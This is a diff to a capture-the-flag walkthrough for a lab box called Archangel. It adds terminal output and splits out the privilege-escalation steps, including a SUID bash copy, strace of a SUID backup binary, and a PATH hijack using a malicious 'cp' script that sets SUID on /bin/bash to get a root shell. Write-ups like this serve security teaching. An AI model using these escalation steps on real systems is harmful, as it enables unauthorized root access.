@@ -245,11 +245,27 @@ Watch for the SUID copy to appear.
 watch -n 1 ls -lah /home/archangel
 ```
 
-Once `-rwsr-sr-x ... bash` shows up, run it with `-p` to keep the effective UID.
+```text
+Every 1.0s: ls -lah /home/archangel        ubuntu: Sat Apr 25 16:05:07 2026
+
+total 1.2M
+drwxr-xr-x 6 archangel archangel 4.0K Apr 25 16:05 .
+drwxr-xr-x 3 root      root      4.0K Nov 18  2020 ..
+-rwsr-sr-x 1 archangel archangel 1.1M Apr 25 16:05 bash
+drwxr-xr-x 2 archangel archangel 4.0K Nov 18  2020 myfiles
+drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 secret
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+```
+
+Once the SUID `bash` copy appears, run it with `-p` to keep the effective UID.
 
 ```bash
 /home/archangel/bash -p
-# uid=33(www-data) gid=33(www-data) euid=1001(archangel) egid=1001(archangel)
+```
+
+```text
+bash-4.4$ id
+uid=33(www-data) gid=33(www-data) euid=1001(archangel) egid=1001(archangel) groups=1001(archangel),33(www-data)
 ```
 
 Read Flag 4 from the `secret` directory.
@@ -283,32 +299,56 @@ ssh -i ./private.key archangel@archangel
 strace ./backup 2>&1
 ```
 
-The binary forks a child that runs `cp` without a full path:
+The key lines in the output — the binary forks a child process, and that child tries to run `cp` without a full path:
 
 ```text
-cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+setuid(0)                               = -1 EPERM (Operation not permitted)
+setgid(0)                               = -1 EPERM (Operation not permitted)
+clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0x7ffec78cf01c) = 1057
+wait4(1057, cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+0x7ffec78cf018, 0, NULL)    = 1057
++++ exited with 0 +++
 ```
 
-`cp` resolves through `PATH`. Add `.` to the front of `PATH` and drop a malicious `cp` in the current directory.
+The `setuid(0) = EPERM` is a strace artifact — ptrace disables SUID. The binary escalates fine when run without strace. What matters is the child: it calls `cp` with no `/bin/` prefix, so `cp` resolves through `PATH`.
+
+Create a malicious `cp` in the current directory.
 
 ```bash
-echo -e '#!/bin/bash\nchmod +s /bin/bash 2>/dev/null' > cp
+vi cp
+```
+
+```bash
+#!/bin/bash
+chmod +s /bin/bash 2> /dev/null
+```
+
+Make it executable, prepend `.` to `PATH`, and run the binary.
+
+```bash
 chmod +x cp
 PATH=.:$PATH ./backup
 ```
 
-The SUID binary calls `./cp` as root. Check that `/bin/bash` now has the SUID bit.
+The SUID binary calls `./cp` as root. Check `/bin/bash` now has the SUID bit.
 
 ```bash
 ls -lah /bin/bash
-# -rwsr-sr-x 1 root root 1.1M Jun  7  2019 /bin/bash
+```
+
+```text
+-rwsr-sr-x 1 root root 1.1M Jun  7  2019 /bin/bash
 ```
 
 Run `bash -p` to get a root shell.
 
 ```bash
 /bin/bash -p
-# uid=1001(archangel) gid=1001(archangel) euid=0(root) egid=0(root)
+```
+
+```text
+bash-4.4# id
+uid=1001(archangel) gid=1001(archangel) euid=0(root) egid=0(root) groups=0(root),1001(archangel)
 ```
 
 Read the root flag.
